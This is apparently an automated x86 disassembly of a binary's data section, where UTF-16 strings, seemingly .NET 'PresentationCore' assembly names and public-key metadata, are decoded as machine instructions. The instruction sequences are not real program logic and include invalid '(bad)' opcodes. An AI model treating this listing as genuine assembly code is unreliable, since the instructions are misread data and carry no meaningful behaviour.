  40341d:	add    BYTE PTR [edi+0x0],ch
  403420:	bound  eax,QWORD PTR [eax]
  403422:	push   ecx
  403423:	add    BYTE PTR [ebp+0x0],dh
  403426:	add    BYTE PTR gs:[ebp+0x0],dh
  40342a:	add    BYTE PTR gs:[eax],ah
  40342d:	add    BYTE PTR [edi+0x0],dh
  403430:	popa   
  403431:	add    BYTE PTR [ebx+0x0],dh
  403434:	and    BYTE PTR [eax],al
  403436:	add    BYTE PTR gs:[ebp+0x0],ch
  40343a:	jo     0x40343c
  40343c:	je     0x40343e
  40343e:	jns    0x403440
  403440:	sub    al,0x0
  403442:	and    BYTE PTR [eax],al
  403444:	outs   dx,BYTE PTR ds:[esi]
  403445:	add    BYTE PTR [edi+0x0],ch
  403448:	je     0x40344a
  40344a:	and    BYTE PTR [eax],al
  40344c:	ja     0x40344e
  40344e:	popa   
  40344f:	add    BYTE PTR [ecx+0x0],ch
  403452:	je     0x403454
  403454:	imul   eax,DWORD PTR [eax],0x67006e
  40345a:	and    BYTE PTR [eax],al
  40345c:	data16 add BYTE PTR [edi+0x0],ch
  403460:	jb     0x403462
  403462:	and    BYTE PTR [eax],al
  403464:	jo     0x403466
  403466:	jb     0x403468
  403468:	imul   eax,DWORD PTR [eax],0x74006e
  40346e:	imul   eax,DWORD PTR [eax],0x67006e
  403474:	add    BYTE PTR cs:[eax],al
  403477:	add    eax,0x5c005c
  40347c:	add    BYTE PTR [eax],al
  40347e:	add    BYTE PTR [eax],al
  403480:	and    al,0x2a
  403482:	xchg   ebp,eax
  403483:	sar    esp,1
  403485:	(bad)  
  403486:	xlat   BYTE PTR ds:[ebx]
  403487:	dec    edx
  403488:	mov    bl,0x22
  40348a:	out    dx,eax
  40348b:	mov    ch,0x74
  40348d:	sbb    eax,0x8001528
  403492:	mov    bh,0x7a
  403494:	pop    esp
  403495:	push   esi
  403496:	sbb    DWORD PTR [eax+eiz*8],esi
  403499:	mov    DWORD PTR [edx],eax
  40349b:	push   es
  40349c:	push   cs
  40349d:	and    BYTE PTR [ebx],dh
  40349f:	add    BYTE PTR [ecx],dh
  4034a1:	add    BYTE PTR [edx+0x0],ah
  4034a4:	data16 add BYTE PTR [ebx],dh
  4034a7:	add    BYTE PTR [eax],bh
  4034a9:	add    BYTE PTR ds:0x61003600,dh
  4034af:	add    BYTE PTR [eax+eax*1+0x33],ah
  4034b3:	add    BYTE PTR [esi],dh
  4034b5:	add    BYTE PTR [eax+eax*1],dh
  4034b8:	add    BYTE PTR gs:[ebx],dh
  4034bb:	add    BYTE PTR ds:0x30808200,dh
  4034c1:	add    BYTE PTR [eax],dh
  4034c3:	add    BYTE PTR [edx],dh
  4034c5:	add    BYTE PTR [eax+eax*1],dh
  4034c8:	xor    BYTE PTR [eax],al
  4034ca:	xor    BYTE PTR [eax],al
  4034cc:	xor    BYTE PTR [eax],al
  4034ce:	xor    BYTE PTR [eax],al
  4034d0:	xor    BYTE PTR [eax],al
  4034d2:	xor    al,0x0
  4034d4:	cmp    BYTE PTR [eax],al
  4034d6:	xor    BYTE PTR [eax],al
  4034d8:	xor    BYTE PTR [eax],al
  4034da:	xor    BYTE PTR [eax],al
  4034dc:	xor    BYTE PTR [eax],al
  4034de:	xor    BYTE PTR [eax],al
  4034e0:	cmp    DWORD PTR [eax],eax
  4034e2:	xor    al,0x0
  4034e4:	xor    BYTE PTR [eax],al
  4034e6:	xor    BYTE PTR [eax],al
  4034e8:	xor    BYTE PTR [eax],al
  4034ea:	xor    BYTE PTR [eax],al
  4034ec:	xor    BYTE PTR [eax],al
  4034ee:	xor    BYTE PTR [eax],al
  4034f0:	xor    BYTE PTR [eax],al
  4034f2:	add    BYTE PTR ss:[eax],dh
  4034f5:	add    BYTE PTR [edx],dh
  4034f7:	add    BYTE PTR [eax],dh
  4034f9:	add    BYTE PTR [eax],dh
  4034fb:	add    BYTE PTR [eax],dh
  4034fd:	add    BYTE PTR [eax],dh
  4034ff:	add    BYTE PTR [eax],dh
  403501:	add    BYTE PTR [eax],dh
  403503:	add    BYTE PTR [edx],dh
  403505:	add    BYTE PTR [eax+eax*1],dh
  403508:	xor    BYTE PTR [eax],al
  40350a:	xor    BYTE PTR [eax],al
  40350c:	xor    BYTE PTR [eax],al
  40350e:	xor    BYTE PTR [eax],al
  403510:	xor    eax,0x35003200
  403515:	add    BYTE PTR [ebx],dh
  403517:	add    BYTE PTR [eax+eax*1],dh
  40351a:	xor    DWORD PTR [eax],eax
  40351c:	xor    eax,DWORD PTR [eax]
  40351e:	xor    DWORD PTR [eax],eax
  403520:	xor    BYTE PTR [eax],al
  403522:	xor    BYTE PTR [eax],al
  403524:	xor    BYTE PTR [eax],al
  403526:	xor    al,0x0
  403528:	xor    BYTE PTR [eax],al
  40352a:	xor    BYTE PTR [eax],al
  40352c:	xor    BYTE PTR [eax],al
  40352e:	xor    BYTE PTR [eax],al
  403530:	xor    BYTE PTR [eax],al
  403532:	xor    DWORD PTR [eax],eax
  403534:	xor    BYTE PTR [eax],al
  403536:	xor    BYTE PTR [eax],al
  403538:	xor    BYTE PTR [eax],al
  40353a:	xor    DWORD PTR [eax],eax
  40353c:	xor    BYTE PTR [eax],al
  40353e:	xor    BYTE PTR [eax],al
  403540:	bound  eax,QWORD PTR [eax]
  403542:	xor    eax,0x63006600
  403547:	add    BYTE PTR [ecx],bh
  403549:	add    BYTE PTR [eax],dh
  40354b:	add    BYTE PTR [ebp+0x0],ah
  40354e:	aaa    
  40354f:	add    BYTE PTR [eax],dh
  403551:	add    BYTE PTR [edx],dh
  403553:	add    BYTE PTR [edi],dh
  403555:	add    BYTE PTR [esi+0x0],ah
  403558:	add    BYTE PTR ss:[edi],dh
  40355b:	add    BYTE PTR [eax],bh
  40355d:	add    BYTE PTR [edi],dh
  40355f:	add    BYTE PTR [ecx],dh
  403561:	add    BYTE PTR [ebp+0x0],ah
  403564:	aaa    
  403565:	add    BYTE PTR [edi],dh
  403567:	add    BYTE PTR [ebx],dh
  403569:	add    BYTE PTR [ecx+0x0],ah
  40356c:	cmp    BYTE PTR [eax],al
  40356e:	data16 add BYTE PTR [eax+eax*1+0x65],ah
  403573:	add    BYTE PTR [eax],bh
  403575:	add    BYTE PTR [ecx],bh
  403577:	add    BYTE PTR [ebx],dh
  403579:	add    BYTE PTR [eax],bh
  40357b:	add    BYTE PTR [ebx+0x0],ah
  40357e:	cmp    BYTE PTR [eax],al
  403580:	xor    DWORD PTR [eax],eax
  403582:	add    BYTE PTR fs:[eax+eax*1+0x34],ah
  403587:	add    BYTE PTR [eax],dh
  403589:	add    BYTE PTR [edx],dh
  40358b:	add    BYTE PTR [edx+0x0],ah
  40358e:	popa   
  40358f:	add    BYTE PTR [esi],dh
  403591:	add    BYTE PTR ds:0x39006200,dh
  403597:	add    BYTE PTR [edx],dh
  403599:	add    BYTE PTR [eax],dh
  40359b:	add    BYTE PTR [ecx],dh
  40359d:	add    BYTE PTR [eax+eax*1+0x36],ah
  4035a1:	add    BYTE PTR [eax],dh
  4035a3:	add    BYTE PTR ds:0x33003900,dh
  4035a9:	add    BYTE PTR [ebp+0x0],ah
  4035ac:	cmp    DWORD PTR [eax],eax
  4035ae:	add    BYTE PTR ss:[ebx+0x0],ah
  4035b2:	xor    al,0x0
  4035b4:	cmp    DWORD PTR [eax],eax
  4035b6:	xor    al,BYTE PTR [eax]
  4035b8:	add    BYTE PTR ss:0x65003100,dh
  4035bf:	add    BYTE PTR [eax],bh
  4035c1:	add    BYTE PTR [eax],bh
  4035c3:	add    BYTE PTR [ecx],bh
  4035c5:	add    BYTE PTR [ebx+0x0],ah
  4035c8:	arpl   WORD PTR [eax],ax
  4035ca:	xor    DWORD PTR [eax],eax
  4035cc:	xor    eax,DWORD PTR [eax]
  4035ce:	data16 add BYTE PTR [ecx],dh
  4035d1:	add    BYTE PTR [eax+eax*1],dh
  4035d4:	xor    DWORD PTR [eax],eax
  4035d6:	xor    eax,0x62006500
  4035db:	add    BYTE PTR [edx+0x0],ah
  4035de:	xor    eax,0x66003300
  4035e3:	add    BYTE PTR [ecx+0x0],ah
  4035e6:	arpl   WORD PTR [eax],ax
  4035e8:	xor    DWORD PTR [eax],eax
  4035ea:	xor    DWORD PTR [eax],eax
  4035ec:	xor    eax,DWORD PTR [eax]
  4035ee:	xor    DWORD PTR [eax],eax
  4035f0:	popa   
  4035f1:	add    BYTE PTR [ebp+0x0],ah
  4035f4:	xor    BYTE PTR [eax],al
  4035f6:	bound  eax,QWORD PTR [eax]
  4035f8:	add    BYTE PTR fs:[ebx],dh
  4035fb:	add    BYTE PTR [ebx],dh
  4035fd:	add    BYTE PTR [ebx],dh
  4035ff:	add    BYTE PTR [ebx+0x0],ah
  403602:	xor    eax,0x65006500
  403607:	add    BYTE PTR [esi],dh
  403609:	add    BYTE PTR [eax],dh
  40360b:	add    BYTE PTR [edx],dh
  40360d:	add    BYTE PTR [ecx],dh
  40360f:	add    BYTE PTR [esi],dh
  403611:	add    BYTE PTR [edi],dh
  403613:	add    BYTE PTR [edx],dh
  403615:	add    BYTE PTR [eax+eax*1+0x39],ah
  403619:	add    BYTE PTR [edi],dh
  40361b:	add    BYTE PTR [ecx],dh
  40361d:	add    BYTE PTR [eax],bh
  40361f:	add    BYTE PTR [ebp+0x0],ah
  403622:	popa   
  403623:	add    BYTE PTR [ebx],dh
  403625:	add    BYTE PTR [ecx],dh
  403627:	add    BYTE PTR [ecx+0x0],ah
  40362a:	cmp    BYTE PTR [eax],al
  40362c:	popa   
  40362d:	add    BYTE PTR [ebp+0x0],ah
  403630:	bound  eax,QWORD PTR [eax]
  403632:	add    BYTE PTR fs:[eax],dh
  403635:	add    BYTE PTR [eax+eax*1+0x61],ah
  403639:	add    BYTE PTR [eax],dh
  40363b:	add    BYTE PTR [eax],dh
  40363d:	add    BYTE PTR [edi],dh
  40363f:	add    BYTE PTR [edx],dh
  403641:	add    BYTE PTR [esi+0x0],ah
  403644:	xor    al,BYTE PTR [eax]
  403646:	xor    eax,0x38006400
  40364b:	add    BYTE PTR [edi],dh
  40364d:	add    BYTE PTR [eax+eax*1+0x62],ah
  403651:	add    BYTE PTR [ecx+0x0],ah
  403654:	add    BYTE PTR ss:[esi+0x0],ah
  403658:	arpl   WORD PTR [eax],ax
  40365a:	cmp    DWORD PTR [eax],eax
  40365c:	xor    BYTE PTR [eax],al
  40365e:	data16 add BYTE PTR [esi+0x0],ah
  403662:	add    BYTE PTR fs:0x38003900,dh
  403669:	add    BYTE PTR [ebp+0x0],ah
  40366c:	add    BYTE PTR fs:[eax+eax*1],dh
  403670:	add    BYTE PTR fs:[ecx+0x0],ah
  403674:	xor    eax,DWORD PTR [eax]
  403676:	xor    eax,0x34006500
  40367b:	add    BYTE PTR [eax+eax*1],dh
  40367e:	arpl   WORD PTR [eax],ax
  403680:	xor    eax,DWORD PTR [eax]
  403682:	cmp    DWORD PTR [eax],eax
  403684:	cmp    BYTE PTR [eax],al
  403686:	arpl   WORD PTR [eax],ax
  403688:	xor    al,0x0
  40368a:	xor    eax,0x33003400
  40368f:	add    BYTE PTR [eax],dh
  403691:	add    BYTE PTR [edi],dh
  403693:	add    BYTE PTR [ebp+0x0],ah
  403696:	cmp    BYTE PTR [eax],al
  403698:	add    BYTE PTR gs:[ebx],dh
  40369b:	add    BYTE PTR [ebx],dh
  40369d:	add    BYTE PTR [edx+0x0],ah
  4036a0:	cmp    BYTE PTR [eax],al
  4036a2:	xor    al,0x0
  4036a4:	xor    al,BYTE PTR [eax]
  4036a6:	add    BYTE PTR ss:[ecx],dh
  4036a9:	add    BYTE PTR [eax+eax*1],dh
  4036ac:	xor    eax,DWORD PTR [eax]
  4036ae:	add    BYTE PTR fs:[ecx+0x0],ah
  4036b2:	add    BYTE PTR gs:[ebx+0x0],ah
  4036b6:	cmp    DWORD PTR [eax],eax
  4036b8:	data16 add BYTE PTR ds:0x36003900,dh
  4036bf:	add    BYTE PTR [eax],bh
  4036c1:	add    BYTE PTR [ebx],dh
  4036c3:	add    BYTE PTR [esi],dh
  4036c5:	add    BYTE PTR [esi+0x0],ah
  4036c8:	cmp    DWORD PTR [eax],eax
  4036ca:	aaa    
  4036cb:	add    BYTE PTR [ebx+0x0],ah
  4036ce:	cmp    BYTE PTR [eax],al
  4036d0:	data16 add BYTE PTR [edi],dh
  4036d3:	add    BYTE PTR [eax+eax*1],dh
  4036d6:	aaa    
  4036d7:	add    BYTE PTR ds:0x65003000,dh
  4036dd:	add    BYTE PTR ds:0x37003900,dh
  4036e3:	add    BYTE PTR ds:0x36006300,dh
  4036e9:	add    BYTE PTR [eax+eax*1],dh
  4036ec:	add    BYTE PTR gs:[edx],dh
  4036ef:	add    BYTE PTR [ecx],dh
  4036f1:	add    BYTE PTR [eax],bh
  4036f3:	add    BYTE PTR [ecx],bh
  4036f5:	add    BYTE PTR [esi+0x0],ah
  4036f8:	xor    al,0x0
  4036fa:	xor    eax,0x65006400
  4036ff:	add    BYTE PTR [esi+0x0],ah
  403702:	xor    al,0x0
  403704:	add    BYTE PTR ss:[edx+0x0],ah
  403708:	xor    al,BYTE PTR [eax]
  40370a:	popa   
  40370b:	add    BYTE PTR [edx],dh
  40370d:	add    BYTE PTR [edx+0x0],ah
  403710:	xor    DWORD PTR [eax],eax
  403712:	xor    al,BYTE PTR [eax]
  403714:	xor    al,0x0
  403716:	aaa    
  403717:	add    BYTE PTR [ecx+0x0],ah
  40371a:	add    BYTE PTR fs:[ebx+0x0],ah
  40371e:	xor    eax,DWORD PTR [eax]
  403720:	add    BYTE PTR ss:0x62003200,dh
  403727:	add    BYTE PTR [esi+0x0],ah
  40372a:	xor    eax,0x33006300
  40372f:	add    BYTE PTR [eax],dh
  403731:	add    BYTE PTR [eax],bh
  403733:	add    BYTE PTR [eax],dh
  403735:	add    BYTE PTR ds:0x64003500,dh
  40373b:	add    BYTE PTR [ecx+0x0],ah
  40373e:	cmp    DWORD PTR [eax],eax
  403740:	push   cs
  403741:	xor    eax,DWORD PTR [eax]
  403743:	add    BYTE PTR cs:[eax],dh
  403746:	add    BYTE PTR [esi],ch
  403748:	add    BYTE PTR [eax],dh
  40374a:	add    BYTE PTR [esi],ch
  40374c:	add    BYTE PTR [eax],dh
  40374e:	add    BYTE PTR [edi+ebx*2],cl
  403751:	add    BYTE PTR [esi+0x0],dh
  403754:	xor    BYTE PTR [eax],al
  403756:	xor    eax,DWORD PTR [eax]
  403758:	xor    BYTE PTR [eax],al
  40375a:	xor    BYTE PTR [eax],al
  40375c:	cmp    BYTE PTR [eax+0x720050],0x65
  403763:	add    BYTE PTR [ebx+0x0],dh
  403766:	add    BYTE PTR gs:[esi+0x0],ch
  40376a:	je     0x40376c
  40376c:	popa   
  40376d:	add    BYTE PTR [eax+eax*1+0x69],dh
  403771:	add    BYTE PTR [edi+0x0],ch
  403774:	outs   dx,BYTE PTR ds:[esi]
  403775:	add    BYTE PTR [ebx+0x0],al
  403778:	outs   dx,DWORD PTR ds:[esi]
  403779:	add    BYTE PTR [edx+0x0],dh
  40377c:	add    BYTE PTR gs:[eax+eax*1],ch
  403780:	and    BYTE PTR [eax],al
  403782:	push   eax
  403783:	add    BYTE PTR [ebp+0x0],dh
  403786:	bound  eax,QWORD PTR [eax]
  403788:	ins    BYTE PTR es:[edi],dx
  403789:	add    BYTE PTR [ecx+0x0],ch
  40378c:	arpl   WORD PTR [eax],ax
  40378e:	dec    ebx
  40378f:	add    BYTE PTR [ebp+0x0],ah
  403792:	jns    0x403794
  403794:	cmp    eax,0x30003000
  403799:	add    BYTE PTR [edx],dh
  40379b:	add    BYTE PTR [eax+eax*1],dh
  40379e:	xor    BYTE PTR [eax],al
  4037a0:	xor    BYTE PTR [eax],al
  4037a2:	xor    BYTE PTR [eax],al
  4037a4:	xor    BYTE PTR [eax],al
  4037a6:	xor    BYTE PTR [eax],al
  4037a8:	xor    al,0x0
  4037aa:	cmp    BYTE PTR [eax],al
  4037ac:	xor    BYTE PTR [eax],al
  4037ae:	xor    BYTE PTR [eax],al
  4037b0:	xor    BYTE PTR [eax],al
  4037b2:	xor    BYTE PTR [eax],al
  4037b4:	xor    BYTE PTR [eax],al
  4037b6:	cmp    DWORD PTR [eax],eax
  4037b8:	xor    al,0x0
  4037ba:	xor    BYTE PTR [eax],al
  4037bc:	xor    BYTE PTR [eax],al
  4037be:	xor    BYTE PTR [eax],al
  4037c0:	xor    BYTE PTR [eax],al
  4037c2:	xor    BYTE PTR [eax],al
  4037c4:	xor    BYTE PTR [eax],al
  4037c6:	xor    BYTE PTR [eax],al
  4037c8:	add    BYTE PTR ss:[eax],dh
  4037cb:	add    BYTE PTR [edx],dh
  4037cd:	add    BYTE PTR [eax],dh
  4037cf:	add    BYTE PTR [eax],dh
  4037d1:	add    BYTE PTR [eax],dh
  4037d3:	add    BYTE PTR [eax],dh
  4037d5:	add    BYTE PTR [eax],dh
  4037d7:	add    BYTE PTR [eax],dh
  4037d9:	add    BYTE PTR [edx],dh
  4037db:	add    BYTE PTR [eax+eax*1],dh
  4037de:	xor    BYTE PTR [eax],al
  4037e0:	xor    BYTE PTR [eax],al
  4037e2:	xor    BYTE PTR [eax],al
  4037e4:	xor    BYTE PTR [eax],al
  4037e6:	xor    eax,0x35003200
  4037eb:	add    BYTE PTR [ebx],dh
  4037ed:	add    BYTE PTR [eax+eax*1],dh
  4037f0:	xor    DWORD PTR [eax],eax
  4037f2:	xor    eax,DWORD PTR [eax]
  4037f4:	xor    DWORD PTR [eax],eax
  4037f6:	xor    BYTE PTR [eax],al
  4037f8:	xor    BYTE PTR [eax],al
  4037fa:	xor    BYTE PTR [eax],al
  4037fc:	xor    al,0x0
  4037fe:	xor    BYTE PTR [eax],al
  403800:	xor    BYTE PTR [eax],al
  403802:	xor    BYTE PTR [eax],al
  403804:	xor    BYTE PTR [eax],al
  403806:	xor    BYTE PTR [eax],al
  403808:	xor    DWORD PTR [eax],eax
  40380a:	xor    BYTE PTR [eax],al
  40380c:	xor    BYTE PTR [eax],al
  40380e:	xor    BYTE PTR [eax],al
  403810:	xor    DWORD PTR [eax],eax
  403812:	xor    BYTE PTR [eax],al
  403814:	xor    BYTE PTR [eax],al
  403816:	bound  eax,QWORD PTR [eax]
  403818:	xor    eax,0x63006600
  40381d:	add    BYTE PTR [ecx],bh
  40381f:	add    BYTE PTR [eax],dh
  403821:	add    BYTE PTR [ebp+0x0],ah
  403824:	aaa    
  403825:	add    BYTE PTR [eax],dh
  403827:	add    BYTE PTR [edx],dh
  403829:	add    BYTE PTR [edi],dh
  40382b:	add    BYTE PTR [esi+0x0],ah
  40382e:	add    BYTE PTR ss:[edi],dh
  403831:	add    BYTE PTR [eax],bh
  403833:	add    BYTE PTR [edi],dh
  403835:	add    BYTE PTR [ecx],dh
  403837:	add    BYTE PTR [ebp+0x0],ah
  40383a:	aaa    
  40383b:	add    BYTE PTR [edi],dh
  40383d:	add    BYTE PTR [ebx],dh
  40383f:	add    BYTE PTR [ecx+0x0],ah
  403842:	cmp    BYTE PTR [eax],al
  403844:	data16 add BYTE PTR [eax+eax*1+0x65],ah
  403849:	add    BYTE PTR [eax],bh
  40384b:	add    BYTE PTR [ecx],bh
  40384d:	add    BYTE PTR [ebx],dh
  40384f:	add    BYTE PTR [eax],bh
  403851:	add    BYTE PTR [ebx+0x0],ah
  403854:	cmp    BYTE PTR [eax],al
  403856:	xor    DWORD PTR [eax],eax
  403858:	add    BYTE PTR fs:[eax+eax*1+0x34],ah
  40385d:	add    BYTE PTR [eax],dh
  40385f:	add    BYTE PTR [edx],dh
  403861:	add    BYTE PTR [edx+0x0],ah
  403864:	popa   
  403865:	add    BYTE PTR [esi],dh
  403867:	add    BYTE PTR ds:0x39006200,dh
  40386d:	add    BYTE PTR [edx],dh
  40386f:	add    BYTE PTR [eax],dh
  403871:	add    BYTE PTR [ecx],dh
  403873:	add    BYTE PTR [eax+eax*1+0x36],ah
  403877:	add    BYTE PTR [eax],dh
  403879:	add    BYTE PTR ds:0x33003900,dh
  40387f:	add    BYTE PTR [ebp+0x0],ah
  403882:	cmp    DWORD PTR [eax],eax
  403884:	add    BYTE PTR ss:[ebx+0x0],ah
  403888:	xor    al,0x0
  40388a:	cmp    DWORD PTR [eax],eax
  40388c:	xor    al,BYTE PTR [eax]
  40388e:	add    BYTE PTR ss:0x65003100,dh
  403895:	add    BYTE PTR [eax],bh
  403897:	add    BYTE PTR [eax],bh
  403899:	add    BYTE PTR [ecx],bh
  40389b:	add    BYTE PTR [ebx+0x0],ah
  40389e:	arpl   WORD PTR [eax],ax
  4038a0:	xor    DWORD PTR [eax],eax
  4038a2:	xor    eax,DWORD PTR [eax]
  4038a4:	data16 add BYTE PTR [ecx],dh
  4038a7:	add    BYTE PTR [eax+eax*1],dh
  4038aa:	xor    DWORD PTR [eax],eax
  4038ac:	xor    eax,0x62006500
  4038b1:	add    BYTE PTR [edx+0x0],ah
  4038b4:	xor    eax,0x66003300
  4038b9:	add    BYTE PTR [ecx+0x0],ah
  4038bc:	arpl   WORD PTR [eax],ax
  4038be:	xor    DWORD PTR [eax],eax
  4038c0:	xor    DWORD PTR [eax],eax
  4038c2:	xor    eax,DWORD PTR [eax]
  4038c4:	xor    DWORD PTR [eax],eax
  4038c6:	popa   
  4038c7:	add    BYTE PTR [ebp+0x0],ah
  4038ca:	xor    BYTE PTR [eax],al
  4038cc:	bound  eax,QWORD PTR [eax]
  4038ce:	add    BYTE PTR fs:[ebx],dh
  4038d1:	add    BYTE PTR [ebx],dh
  4038d3:	add    BYTE PTR [ebx],dh
  4038d5:	add    BYTE PTR [ebx+0x0],ah
  4038d8:	xor    eax,0x65006500
  4038dd:	add    BYTE PTR [esi],dh
  4038df:	add    BYTE PTR [eax],dh
  4038e1:	add    BYTE PTR [edx],dh
  4038e3:	add    BYTE PTR [ecx],dh
  4038e5:	add    BYTE PTR [esi],dh
  4038e7:	add    BYTE PTR [edi],dh
  4038e9:	add    BYTE PTR [edx],dh
  4038eb:	add    BYTE PTR [eax+eax*1+0x39],ah
  4038ef:	add    BYTE PTR [edi],dh
  4038f1:	add    BYTE PTR [ecx],dh
  4038f3:	add    BYTE PTR [eax],bh
  4038f5:	add    BYTE PTR [ebp+0x0],ah
  4038f8:	popa   
  4038f9:	add    BYTE PTR [ebx],dh
  4038fb:	add    BYTE PTR [ecx],dh
  4038fd:	add    BYTE PTR [ecx+0x0],ah
  403900:	cmp    BYTE PTR [eax],al
  403902:	popa   
  403903:	add    BYTE PTR [ebp+0x0],ah
  403906:	bound  eax,QWORD PTR [eax]
  403908:	add    BYTE PTR fs:[eax],dh
  40390b:	add    BYTE PTR [eax+eax*1+0x61],ah
  40390f:	add    BYTE PTR [eax],dh
  403911:	add    BYTE PTR [eax],dh
  403913:	add    BYTE PTR [edi],dh
  403915:	add    BYTE PTR [edx],dh
  403917:	add    BYTE PTR [esi+0x0],ah
  40391a:	xor    al,BYTE PTR [eax]
  40391c:	xor    eax,0x38006400
  403921:	add    BYTE PTR [edi],dh
  403923:	add    BYTE PTR [eax+eax*1+0x62],ah
  403927:	add    BYTE PTR [ecx+0x0],ah
  40392a:	add    BYTE PTR ss:[esi+0x0],ah
  40392e:	arpl   WORD PTR [eax],ax
  403930:	cmp    DWORD PTR [eax],eax
  403932:	xor    BYTE PTR [eax],al
  403934:	data16 add BYTE PTR [esi+0x0],ah
  403938:	add    BYTE PTR fs:0x38003900,dh
  40393f:	add    BYTE PTR [ebp+0x0],ah
  403942:	add    BYTE PTR fs:[eax+eax*1],dh
  403946:	add    BYTE PTR fs:[ecx+0x0],ah
  40394a:	xor    eax,DWORD PTR [eax]
  40394c:	xor    eax,0x34006500
  403951:	add    BYTE PTR [eax+eax*1],dh
  403954:	arpl   WORD PTR [eax],ax
  403956:	xor    eax,DWORD PTR [eax]
  403958:	cmp    DWORD PTR [eax],eax
  40395a:	cmp    BYTE PTR [eax],al
  40395c:	arpl   WORD PTR [eax],ax
  40395e:	xor    al,0x0
  403960:	xor    eax,0x33003400
  403965:	add    BYTE PTR [eax],dh
  403967:	add    BYTE PTR [edi],dh
  403969:	add    BYTE PTR [ebp+0x0],ah
  40396c:	cmp    BYTE PTR [eax],al
  40396e:	add    BYTE PTR gs:[ebx],dh
  403971:	add    BYTE PTR [ebx],dh
  403973:	add    BYTE PTR [edx+0x0],ah
  403976:	cmp    BYTE PTR [eax],al
  403978:	xor    al,0x0
  40397a:	xor    al,BYTE PTR [eax]
  40397c:	add    BYTE PTR ss:[ecx],dh
  40397f:	add    BYTE PTR [eax+eax*1],dh
  403982:	xor    eax,DWORD PTR [eax]
  403984:	add    BYTE PTR fs:[ecx+0x0],ah
  403988:	add    BYTE PTR gs:[ebx+0x0],ah
  40398c:	cmp    DWORD PTR [eax],eax
  40398e:	data16 add BYTE PTR ds:0x36003900,dh
  403995:	add    BYTE PTR [eax],bh
  403997:	add    BYTE PTR [ebx],dh
  403999:	add    BYTE PTR [esi],dh
  40399b:	add    BYTE PTR [esi+0x0],ah
  40399e:	cmp    DWORD PTR [eax],eax
  4039a0:	aaa    
  4039a1:	add    BYTE PTR [ebx+0x0],ah
  4039a4:	cmp    BYTE PTR [eax],al
  4039a6:	data16 add BYTE PTR [edi],dh
  4039a9:	add    BYTE PTR [eax+eax*1],dh
  4039ac:	aaa    
  4039ad:	add    BYTE PTR ds:0x65003000,dh
  4039b3:	add    BYTE PTR ds:0x37003900,dh
  4039b9:	add    BYTE PTR ds:0x36006300,dh
  4039bf:	add    BYTE PTR [eax+eax*1],dh
  4039c2:	add    BYTE PTR gs:[edx],dh
  4039c5:	add    BYTE PTR [ecx],dh
  4039c7:	add    BYTE PTR [eax],bh
  4039c9:	add    BYTE PTR [ecx],bh
  4039cb:	add    BYTE PTR [esi+0x0],ah
  4039ce:	xor    al,0x0
  4039d0:	xor    eax,0x65006400
  4039d5:	add    BYTE PTR [esi+0x0],ah
  4039d8:	xor    al,0x0
  4039da:	add    BYTE PTR ss:[edx+0x0],ah
  4039de:	xor    al,BYTE PTR [eax]
  4039e0:	popa   
  4039e1:	add    BYTE PTR [edx],dh
  4039e3:	add    BYTE PTR [edx+0x0],ah
  4039e6:	xor    DWORD PTR [eax],eax
  4039e8:	xor    al,BYTE PTR [eax]
  4039ea:	xor    al,0x0
  4039ec:	aaa    
  4039ed:	add    BYTE PTR [ecx+0x0],ah
  4039f0:	add    BYTE PTR fs:[ebx+0x0],ah
  4039f4:	xor    eax,DWORD PTR [eax]
  4039f6:	add    BYTE PTR ss:0x62003200,dh
  4039fd:	add    BYTE PTR [esi+0x0],ah
  403a00:	xor    eax,0x33006300
  403a05:	add    BYTE PTR [eax],dh
  403a07:	add    BYTE PTR [eax],bh
  403a09:	add    BYTE PTR [eax],dh
  403a0b:	add    BYTE PTR ds:0x64003500,dh
  403a11:	add    BYTE PTR [ecx+0x0],ah
  403a14:	cmp    DWORD PTR [eax],eax
  403a16:	or     dl,0x50
  403a19:	add    BYTE PTR [edx+0x0],dh
  403a1c:	add    BYTE PTR gs:[ebx+0x0],dh
  403a20:	add    BYTE PTR gs:[esi+0x0],ch
  403a24:	je     0x403a26
  403a26:	popa   
  403a27:	add    BYTE PTR [eax+eax*1+0x69],dh
  403a2b:	add    BYTE PTR [edi+0x0],ch
  403a2e:	outs   dx,BYTE PTR ds:[esi]
  403a2f:	add    BYTE PTR [ebx+0x0],al
  403a32:	inc    esi
  403a33:	add    BYTE PTR [esi+0x0],al
  403a36:	push   edx
  403a37:	add    BYTE PTR [ecx+0x0],ah
  403a3a:	jae    0x403a3c
  403a3c:	je     0x403a3e
  403a3e:	add    BYTE PTR gs:[edx+0x0],dh
  403a42:	imul   eax,DWORD PTR [eax],0x65007a
  403a48:	jb     0x403a4a
  403a4a:	sub    al,0x0
  403a4c:	and    BYTE PTR [eax],al
  403a4e:	push   eax
  403a4f:	add    BYTE PTR [ebp+0x0],dh
  403a52:	bound  eax,QWORD PTR [eax]
  403a54:	ins    BYTE PTR es:[edi],dx
  403a55:	add    BYTE PTR [ecx+0x0],ch
  403a58:	arpl   WORD PTR [eax],ax
  403a5a:	dec    ebx
  403a5b:	add    BYTE PTR [ebp+0x0],ah
  403a5e:	jns    0x403a60
  403a60:	cmp    eax,0x30003000
  403a65:	add    BYTE PTR [edx],dh
  403a67:	add    BYTE PTR [eax+eax*1],dh
  403a6a:	xor    BYTE PTR [eax],al
  403a6c:	xor    BYTE PTR [eax],al
  403a6e:	xor    BYTE PTR [eax],al
  403a70:	xor    BYTE PTR [eax],al
  403a72:	xor    BYTE PTR [eax],al
  403a74:	xor    al,0x0
  403a76:	cmp    BYTE PTR [eax],al
  403a78:	xor    BYTE PTR [eax],al
  403a7a:	xor    BYTE PTR [eax],al
  403a7c:	xor    BYTE PTR [eax],al
  403a7e:	xor    BYTE PTR [eax],al
  403a80:	xor    BYTE PTR [eax],al
  403a82:	cmp    DWORD PTR [eax],eax
  403a84:	xor    al,0x0
  403a86:	xor    BYTE PTR [eax],al
  403a88:	xor    BYTE PTR [eax],al
  403a8a:	xor    BYTE PTR [eax],al
  403a8c:	xor    BYTE PTR [eax],al
  403a8e:	xor    BYTE PTR [eax],al
  403a90:	xor    BYTE PTR [eax],al
  403a92:	xor    BYTE PTR [eax],al
  403a94:	add    BYTE PTR ss:[eax],dh
  403a97:	add    BYTE PTR [edx],dh
  403a99:	add    BYTE PTR [eax],dh
  403a9b:	add    BYTE PTR [eax],dh
  403a9d:	add    BYTE PTR [eax],dh
  403a9f:	add    BYTE PTR [eax],dh
  403aa1:	add    BYTE PTR [eax],dh
  403aa3:	add    BYTE PTR [eax],dh
  403aa5:	add    BYTE PTR [edx],dh
  403aa7:	add    BYTE PTR [eax+eax*1],dh
